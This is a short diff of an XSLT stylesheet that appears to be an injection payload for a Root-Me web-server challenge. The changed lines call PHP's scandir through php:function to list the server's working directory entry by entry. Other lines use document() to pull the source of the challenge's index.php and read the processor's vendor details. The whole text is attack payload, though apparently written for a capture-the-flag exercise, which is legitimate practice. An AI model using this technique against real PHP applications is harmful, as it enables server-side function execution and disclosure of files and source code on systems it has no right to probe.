@@ -6,7 +6,12 @@
     	Version: <xsl:value-of select="system-property('xsl:version')" />
     	Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
     	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
-    	Dir: <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
+    	<xsl:variable name="array" select="php:function('scandir', '.')"/>
+        Dir: <xsl:value-of select="exsl:node-set($array)/Item[1]"/>
+        Dir: <xsl:value-of select="exsl:node-set($array)/Item[2]"/>
+        Dir: <xsl:value-of select="exsl:node-set($array)/Item[3]"/>
+        Dir: <xsl:value-of select="exsl:node-set($array)/Item[4]"/>
+        
     	File: <xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>    
     </p>
 </body>
